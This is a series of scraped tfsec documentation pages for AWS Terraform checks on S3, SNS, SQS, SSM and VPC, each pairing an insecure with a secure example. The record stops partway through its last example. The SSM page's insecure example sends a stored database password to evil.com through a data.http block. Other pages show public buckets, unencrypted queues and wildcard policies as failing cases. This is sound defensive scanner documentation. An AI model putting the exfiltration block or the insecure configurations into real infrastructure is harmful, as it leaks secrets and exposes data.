{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/s3/ignore-public-acls/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/s3/ignore-public-acls/index.md", "content": "---\ntitle: S3 Access Block should Ignore Public Acl\n---\n\n# S3 Access Block should Ignore Public Acl\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\n\nS3 buckets should ignore public ACLs on buckets and any objects they contain. By ignoring rather than blocking, PUT calls with public ACLs will still be applied but the ACL will be ignored.\n\n\n### Possible Impact\nPUT calls with public ACLs specified can make objects public\n\n### Suggested Resolution\nEnable ignoring the application of public ACLs in PUT calls\n\n\n### Insecure Example\n\nThe following example will fail the aws-s3-ignore-public-acls check.\n```terraform\n\nresource \"aws_s3_bucket\" \"example\" {\n\tbucket = \"bucket\"\n}\n\n\n resource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n \tbucket = aws_s3_bucket.example.id\n }\n \n resource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n \tbucket = aws_s3_bucket.example.id\n   \n \tignore_public_acls = false\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-s3-ignore-public-acls check.\n```terraform\n\nresource \"aws_s3_bucket\" \"example\" {\n\tbucket = \"bucket\"\n}\n\n resource \"aws_s3_bucket_public_access_block\" \"good_example\" {\n \tbucket = aws_s3_bucket.example.id\n   \n \tignore_public_acls = true\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#ignore_public_acls](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#ignore_public_acls){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:30.144052"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/s3/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/s3/index.md", "content": "---\ntitle: s3\n---\n\n# s3\n\n## Checks\n\n\n- [block-public-acls](block-public-acls) S3 Access block should block public ACL\n\n- [block-public-policy](block-public-policy) S3 Access block should block public policy\n\n- [enable-bucket-encryption](enable-bucket-encryption) Unencrypted S3 bucket.\n\n- [enable-bucket-logging](enable-bucket-logging) S3 Bucket does not have logging enabled.\n\n- [enable-versioning](enable-versioning) S3 Data should be versioned\n\n- [encryption-customer-key](encryption-customer-key) S3 encryption should use Customer Managed Keys\n\n- [ignore-public-acls](ignore-public-acls) S3 Access Block should Ignore Public Acl\n\n- [no-public-access-with-acl](no-public-access-with-acl) S3 Buckets not publicly accessible through ACL.\n\n- [no-public-buckets](no-public-buckets) S3 Access block should restrict public bucket to limit access\n\n- [specify-public-access-block](specify-public-access-block) S3 buckets should each define an aws_s3_bucket_public_access_block\n\n\n\n", "timestamp": "2025-10-24T22:24:30.245811"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/s3/no-public-access-with-acl/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/s3/no-public-access-with-acl/index.md", "content": "---\ntitle: S3 Buckets not publicly accessible through ACL.\n---\n\n# S3 Buckets not publicly accessible through ACL.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\n\nBuckets should not have ACLs that allow public access\n\n\n### Possible Impact\nPublic access to the bucket can lead to data leakage\n\n### Suggested Resolution\nDon't use canned ACLs or switch to private acl\n\n\n### Insecure Example\n\nThe following example will fail the aws-s3-no-public-access-with-acl check.\n```terraform\n\nresource \"aws_s3_bucket\" \"bad_example\" {\n\tacl = \"public-read\"\n}\n\n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-s3-no-public-access-with-acl check.\n```terraform\n\nresource \"aws_s3_bucket\" \"good_example\" {\n\tacl = \"private\"\n}\n\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html](https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:30.533790"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/s3/no-public-buckets/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/s3/no-public-buckets/index.md", "content": "---\ntitle: S3 Access block should restrict public bucket to limit access\n---\n\n# S3 Access block should restrict public bucket to limit access\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nS3 buckets should restrict public policies for the bucket. By enabling, the restrict_public_buckets, only the bucket owner and AWS Services can access if it has a public policy.\n\n### Possible Impact\nPublic buckets can be accessed by anyone\n\n### Suggested Resolution\nLimit the access to public buckets to only the owner or AWS Services (eg; CloudFront)\n\n\n### Insecure Example\n\nThe following example will fail the aws-s3-no-public-buckets check.\n```terraform\n\nresource \"aws_s3_bucket\" \"example\" {\n\tbucket = \"bucket\"\n}\n\n resource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n \tbucket = aws_s3_bucket.example.id\n }\n \n resource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n \tbucket = aws_s3_bucket.example.id\n   \n \trestrict_public_buckets = false\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-s3-no-public-buckets check.\n```terraform\n\nresource \"aws_s3_bucket\" \"example\" {\n\tbucket = \"bucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"good_example\" {\n \tbucket = aws_s3_bucket.example.id\n   \n \trestrict_public_buckets = true\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#restrict_public_buckets¡](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#restrict_public_buckets¡){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonS3/latest/dev-retired/access-control-block-public-access.html](https://docs.aws.amazon.com/AmazonS3/latest/dev-retired/access-control-block-public-access.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:30.821653"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/s3/specify-public-access-block/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/s3/specify-public-access-block/index.md", "content": "---\ntitle: S3 buckets should each define an aws_s3_bucket_public_access_block\n---\n\n# S3 buckets should each define an aws_s3_bucket_public_access_block\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nThe \"block public access\" settings in S3 override individual policies that apply to a given bucket, meaning that all public access can be controlled in one central types for that bucket. It is therefore good practice to define these settings for each bucket in order to clearly define the public access that can be allowed for it.\n\n### Possible Impact\nPublic access policies may be applied to sensitive data buckets\n\n### Suggested Resolution\nDefine a aws_s3_bucket_public_access_block for the given bucket to control public access policies\n\n\n### Insecure Example\n\nThe following example will fail the aws-s3-specify-public-access-block check.\n```terraform\n\n resource \"aws_s3_bucket\" \"example\" {\n \tbucket = \"example\"\n \tacl = \"private-read\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-s3-specify-public-access-block check.\n```terraform\n\n resource \"aws_s3_bucket\" \"example\" {\n \tbucket = \"example\"\n \tacl = \"private-read\"\n }\n   \n resource \"aws_s3_bucket_public_access_block\" \"example\" {\n \tbucket = aws_s3_bucket.example.id\n \tblock_public_acls   = true\n \tblock_public_policy = true\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#bucket](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#bucket){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:31.125606"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/sns/enable-topic-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/sns/enable-topic-encryption/index.md", "content": "---\ntitle: Unencrypted SNS topic.\n---\n\n# Unencrypted SNS topic.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nTopics should be encrypted to protect their contents.\n\n### Possible Impact\nThe SNS topic messages could be read if compromised\n\n### Suggested Resolution\nTurn on SNS Topic encryption\n\n\n### Insecure Example\n\nThe following example will fail the aws-sns-enable-topic-encryption check.\n```terraform\n\n resource \"aws_sns_topic\" \"bad_example\" {\n \t# no key id specified\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-sns-enable-topic-encryption check.\n```terraform\n\n resource \"aws_sns_topic\" \"good_example\" {\n \tkms_master_key_id = \"/blah\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sns_topic#example-with-server-side-encryption-sse](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sns_topic#example-with-server-side-encryption-sse){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html](https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:31.605792"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/sns/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/sns/index.md", "content": "---\ntitle: sns\n---\n\n# sns\n\n## Checks\n\n\n- [enable-topic-encryption](enable-topic-encryption) Unencrypted SNS topic.\n\n- [topic-encryption-use-cmk](topic-encryption-use-cmk) SNS topic not encrypted with CMK.\n\n\n\n", "timestamp": "2025-10-24T22:24:31.725359"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/sns/topic-encryption-use-cmk/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/sns/topic-encryption-use-cmk/index.md", "content": "---\ntitle: SNS topic not encrypted with CMK.\n---\n\n# SNS topic not encrypted with CMK.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nTopics should be encrypted with customer managed KMS keys and not default AWS managed keys, in order to allow granular key management.\n\n### Possible Impact\nKey management very limited when using default keys.\n\n### Suggested Resolution\nUse a CMK for SNS Topic encryption\n\n\n### Insecure Example\n\nThe following example will fail the aws-sns-topic-encryption-use-cmk check.\n```terraform\n\n resource \"aws_sns_topic\" \"bad_example\" {\n    kms_master_key_id = \"alias/aws/sns\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-sns-topic-encryption-use-cmk check.\n```terraform\n\n resource \"aws_sns_topic\" \"good_example\" {\n \tkms_master_key_id = \"/blah\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sns_topic#example-with-server-side-encryption-sse](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sns_topic#example-with-server-side-encryption-sse){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html](https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:32.002335"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/sqs/enable-queue-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/sqs/enable-queue-encryption/index.md", "content": "---\ntitle: Unencrypted SQS queue.\n---\n\n# Unencrypted SQS queue.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nQueues should be encrypted to protect queue contents.\n\n### Possible Impact\nThe SQS queue messages could be read if compromised\n\n### Suggested Resolution\nTurn on SQS Queue encryption\n\n\n### Insecure Example\n\nThe following example will fail the aws-sqs-enable-queue-encryption check.\n```terraform\n\n resource \"aws_sqs_queue\" \"bad_example\" {\n \t# no key specified\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-sqs-enable-queue-encryption check.\n```terraform\n\n resource \"aws_sqs_queue\" \"good_example\" {\n \tkms_master_key_id = \"/blah\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue#server-side-encryption-sse](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue#server-side-encryption-sse){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html](https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:32.449426"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/sqs/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/sqs/index.md", "content": "---\ntitle: sqs\n---\n\n# sqs\n\n## Checks\n\n\n- [enable-queue-encryption](enable-queue-encryption) Unencrypted SQS queue.\n\n- [no-wildcards-in-policy-documents](no-wildcards-in-policy-documents) AWS SQS policy document has wildcard action statement.\n\n- [queue-encryption-use-cmk](queue-encryption-use-cmk) SQS queue should be encrypted with a CMK.\n\n\n\n", "timestamp": "2025-10-24T22:24:32.549564"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/sqs/no-wildcards-in-policy-documents/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/sqs/no-wildcards-in-policy-documents/index.md", "content": "---\ntitle: AWS SQS policy document has wildcard action statement.\n---\n\n# AWS SQS policy document has wildcard action statement.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nSQS Policy actions should always be restricted to a specific set.\n\nThis ensures that the queue itself cannot be modified or deleted, and prevents possible future additions to queue actions to be implicitly allowed.\n\n### Possible Impact\nSQS policies with wildcard actions allow more that is required\n\n### Suggested Resolution\nKeep policy scope to the minimum that is required to be effective\n\n\n### Insecure Example\n\nThe following example will fail the aws-sqs-no-wildcards-in-policy-documents check.\n```terraform\n\n resource \"aws_sqs_queue_policy\" \"bad_example\" {\n   queue_url = aws_sqs_queue.q.id\n \n   policy = <<POLICY\n {\n   \"Statement\": [\n     {\n       \"Effect\": \"Allow\",\n       \"Principal\": \"*\",\n       \"Action\": \"*\"\n     }\n   ]\n }\n POLICY\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-sqs-no-wildcards-in-policy-documents check.\n```terraform\n\n resource \"aws_sqs_queue_policy\" \"good_example\" {\n   queue_url = aws_sqs_queue.q.id\n \n   policy = <<POLICY\n {\n   \"Statement\": [\n     {\n       \"Effect\": \"Allow\",\n       \"Principal\": \"*\",\n       \"Action\": \"sqs:SendMessage\"\n     }\n   ]\n }\n POLICY\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue_policy](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue_policy){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-security-best-practices.html](https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-security-best-practices.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:32.827665"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/sqs/queue-encryption-use-cmk/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/sqs/queue-encryption-use-cmk/index.md", "content": "---\ntitle: SQS queue should be encrypted with a CMK.\n---\n\n# SQS queue should be encrypted with a CMK.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nQueues should be encrypted with customer managed KMS keys and not default AWS managed keys, in order to allow granular control over access to specific queues.\n\n### Possible Impact\nThe SQS queue messages could be read if compromised. Key management is very limited when using default keys.\n\n### Suggested Resolution\nEncrypt SQS Queue with a customer-managed key\n\n\n### Insecure Example\n\nThe following example will fail the aws-sqs-queue-encryption-use-cmk check.\n```terraform\n\n resource \"aws_sqs_queue\" \"bad_example\" {\n\tkms_master_key_id = \"alias/aws/sqs\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-sqs-queue-encryption-use-cmk check.\n```terraform\n\n resource \"aws_sqs_queue\" \"good_example\" {\n \tkms_master_key_id = \"/blah\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue#server-side-encryption-sse](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue#server-side-encryption-sse){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html](https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:33.159740"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ssm/avoid-leaks-via-http/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ssm/avoid-leaks-via-http/index.md", "content": "---\ntitle: Secrets should not be exfiltrated using Terraform HTTP data blocks\n---\n\n# Secrets should not be exfiltrated using Terraform HTTP data blocks\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nThe data.http block can be used to send secret data outside of the organisation.\n\n### Possible Impact\nSecrets could be exposed outside of the organisation.\n\n### Suggested Resolution\nRemove this potential exfiltration HTTP request.\n\n\n### Insecure Example\n\nThe following example will fail the aws-ssm-avoid-leaks-via-http check.\n```terraform\n\nresource \"aws_ssm_parameter\" \"db_password\" {\n  name = \"db_password\"\n  type = \"SecureString\"\n  value = var.db_password\n}\n\ndata \"http\" \"not_exfiltrating_data_honest\" {\n  url = \"https://evil.com/?p=${aws_ssm_parameter.db_password.value}\"\n}\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ssm-avoid-leaks-via-http check.\n```terraform\n\nresource \"aws_ssm_parameter\" \"db_password\" {\n  name = \"db_password\"\n  type = \"SecureString\"\n  value = var.db_password\n}\n\n \n```\n\n\n\n### Links\n\n\n- [https://sprocketfox.io/xssfox/2022/02/09/terraformsupply/](https://sprocketfox.io/xssfox/2022/02/09/terraformsupply/){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:33.609837"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ssm/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ssm/index.md", "content": "---\ntitle: ssm\n---\n\n# ssm\n\n## Checks\n\n\n- [avoid-leaks-via-http](avoid-leaks-via-http) Secrets should not be exfiltrated using Terraform HTTP data blocks\n\n- [secret-use-customer-key](secret-use-customer-key) Secrets Manager should use customer managed keys\n\n\n\n", "timestamp": "2025-10-24T22:24:33.717988"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ssm/secret-use-customer-key/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ssm/secret-use-customer-key/index.md", "content": "---\ntitle: Secrets Manager should use customer managed keys\n---\n\n# Secrets Manager should use customer managed keys\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nSecrets Manager encrypts secrets by default using a default key created by AWS. To ensure control and granularity of secret encryption, CMK's should be used explicitly.\n\n### Possible Impact\nUsing AWS managed keys reduces the flexibility and control over the encryption key\n\n### Suggested Resolution\nUse customer managed keys\n\n\n### Insecure Example\n\nThe following example will fail the aws-ssm-secret-use-customer-key check.\n```terraform\n\n resource \"aws_secretsmanager_secret\" \"bad_example\" {\n   name       = \"lambda_password\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ssm-secret-use-customer-key check.\n```terraform\n\n resource \"aws_kms_key\" \"secrets\" {\n \tenable_key_rotation = true\n }\n \n resource \"aws_secretsmanager_secret\" \"good_example\" {\n   name       = \"lambda_password\"\n   kms_key_id = aws_kms_key.secrets.arn\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/secretsmanager_secret#kms_key_id](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/secretsmanager_secret#kms_key_id){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/kms/latest/developerguide/services-secrets-manager.html#asm-encrypt](https://docs.aws.amazon.com/kms/latest/developerguide/services-secrets-manager.html#asm-encrypt){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:33.982097"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/vpc/add-description-to-security-group-rule/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/vpc/add-description-to-security-group-rule/index.md", "content": "---\ntitle: Missing description for security group rule.\n---\n\n# Missing description for security group rule.\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nSecurity group rules should include a description for auditing purposes.\n\nSimplifies auditing, debugging, and managing security groups.\n\n### Possible Impact\nDescriptions provide context for the firewall rule reasons\n\n### Suggested Resolution\nAdd descriptions for all security groups rules\n\n\n### Insecure Example\n\nThe following example will fail the aws-vpc-add-description-to-security-group-rule check.\n```terraform\n\n resource \"aws_security_group\" \"bad_example\" {\n   name        = \"http\"\n \n   ingress {\n     from_port   = 80\n     to_port     = 80\n     protocol    = \"tcp\"\n     cidr_blocks = [aws_vpc.main.cidr_block]\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-vpc-add-description-to-security-group-rule check.\n```terraform\n\n resource \"aws_security_group\" \"good_example\" {\n   name        = \"http\"\n   description = \"Allow inbound HTTP traffic\"\n \n   ingress {\n     description = \"HTTP from VPC\"\n     from_port   = 80\n     to_port     = 80\n     protocol    = \"tcp\"\n     cidr_blocks = [aws_vpc.main.cidr_block]\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://www.cloudconformity.com/knowledge-base/aws/EC2/security-group-rules-description.html](https://www.cloudconformity.com/knowledge-base/aws/EC2/security-group-rules-description.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:34.449855"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/vpc/add-description-to-security-group/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/vpc/add-description-to-security-group/index.md", "content": "---\ntitle: Missing description for security group.\n---\n\n# Missing description for security group.\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nSecurity groups should include a description for auditing purposes.\n\nSimplifies auditing, debugging, and managing security groups.\n\n### Possible Impact\nDescriptions provide context for the firewall rule reasons\n\n### Suggested Resolution\nAdd descriptions for all security groups\n\n\n### Insecure Example\n\nThe following example will fail the aws-vpc-add-description-to-security-group check.\n```terraform\n\n resource \"aws_security_group\" \"bad_example\" {\n   name        = \"http\"\n   description = \"\"\n \n   ingress {\n     description = \"HTTP from VPC\"\n     from_port   = 80\n     to_port     = 80\n     protocol    = \"tcp\"\n     cidr_blocks = [aws_vpc.main.cidr_block]\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-vpc-add-description-to-security-group check.\n```terraform\n\n resource \"aws_security_group\" \"good_example\" {\n   name        = \"http\"\n   description = \"Allow inbound HTTP traffic\"\n \n   ingress {\n     description = \"HTTP from VPC\"\n     from_port   = 80\n     to_port     = 80\n     protocol    = \"tcp\"\n     cidr_blocks = [aws_vpc.main.cidr_block]\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://www.cloudconformity.com/knowledge-base/aws/EC2/security-group-rules-description.html](https://www.cloudconformity.com/knowledge-base/aws/EC2/security-group-rules-description.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:34.744269"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/vpc/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/vpc/index.md", "content": "---\ntitle: vpc\n---\n\n# vpc\n\n## Checks\n\n\n- [add-description-to-security-group](add-description-to-security-group) Missing description for security group.\n\n- [add-description-to-security-group-rule](add-description-to-security-group-rule) Missing description for security group rule.\n\n- [no-default-vpc](no-default-vpc) AWS best practice to not use the default VPC for workflows\n\n- [no-excessive-port-access](no-excessive-port-access) An ingress Network ACL rule allows ALL ports.\n\n- [no-public-egress-sgr](no-public-egress-sgr) An egress security group rule allows traffic to /0.\n\n- [no-public-ingress-acl](no-public-ingress-acl) An ingress Network ACL rule allows specific ports from /0.\n\n- [no-public-ingress-sgr](no-public-ingress-sgr) An ingress security group rule allows traffic from /0.\n\n\n\n", "timestamp": "2025-10-24T22:24:34.851994"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/vpc/no-default-vpc/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/vpc/no-default-vpc/index.md", "content": "---\ntitle: AWS best practice to not use the default VPC for workflows\n---\n\n# AWS best practice to not use the default VPC for workflows\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nDefault VPC does not have a lot of the critical security features that standard VPC comes with, new resources should not be created in the default VPC and it should not be present in the Terraform.\n\n### Possible Impact\nThe default VPC does not have critical security features applied\n\n### Suggested Resolution\nCreate a non-default vpc for resources to be created in\n\n\n### Insecure Example\n\nThe following example will fail the aws-vpc-no-default-vpc check.\n```terraform\n\n resource \"aws_default_vpc\" \"default\" {\n \ttags = {\n \t  Name = \"Default VPC\"\n \t}\n   }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-vpc-no-default-vpc check.\n```terraform\n\n # no aws default vpc present\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/default_vpc](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/default_vpc){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/vpc/latest/userguide/default-vpc.html](https://docs.aws.amazon.com/vpc/latest/userguide/default-vpc.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:35.149652"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/vpc/no-excessive-port-access/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/vpc/no-excessive-port-access/index.md", "content": "---\ntitle: An ingress Network ACL rule allows ALL ports.\n---\n\n# An ingress Network ACL rule allows ALL ports.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nEnsure access to specific required ports is allowed, and nothing else.\n\n### Possible Impact\nAll ports exposed for egressing data\n\n### Suggested Resolution\nSet specific allowed ports\n\n\n### Insecure Example\n\nThe following example will fail the aws-vpc-no-excessive-port-access check.\n```terraform\n\n resource \"aws_network_acl_rule\" \"bad_example\" {\n   egress         = false\n   protocol       = \"all\"\n   rule_action    = \"allow\"\n   cidr_block     = \"0.0.0.0/0\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-vpc-no-excessive-port-access check.\n```terraform\n\n resource \"aws_network_acl_rule\" \"good_example\" {\n   egress         = false\n   protocol       = \"tcp\"\n   from_port      